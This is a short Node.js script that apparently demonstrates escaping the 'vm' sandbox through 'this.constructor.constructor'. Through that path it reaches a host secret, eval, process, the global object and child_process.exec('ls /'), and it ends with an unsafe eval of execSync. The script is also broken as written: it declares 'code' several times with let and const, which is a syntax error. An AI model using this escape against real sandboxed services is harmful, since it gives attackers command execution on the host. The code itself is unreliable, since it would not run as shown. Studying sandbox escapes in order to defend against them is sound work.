const vm = require('vm');
const context = {};
vm.createContext(context)


let secret = '14828'

//secret
let code = "this.constructor.constructor('return secret')()"
vm.runInContext(code, context);
//console.log(context.secret_code);


//eval:
secret=1
code="this.constructor.constructor('return eval(secret+1)')()"
vm.runInContext(code, context)

//process:
const process = require('process');
code ="this.constructor.constructor('return process.cwd()')()"
vm.runInContext(code, context)

//Function
const sum = new Function('a', 'b', 'return a + b');
code ="this.constructor.constructor('return sum(2, 6)')()"
vm.runInContext(code, context)

//global
const code ="this.constructor.constructor('return global')()";
vm.runInContext(code, context)

//child_process
let test = "require('child_process').exec('ls /');"
let code = "this.constructor.constructor('return eval(test)')() "
vm.runInContext(code, context)

//unsafe eval
code = "require('child_process').execSync('ls /tmp/');"
eval(code).toString()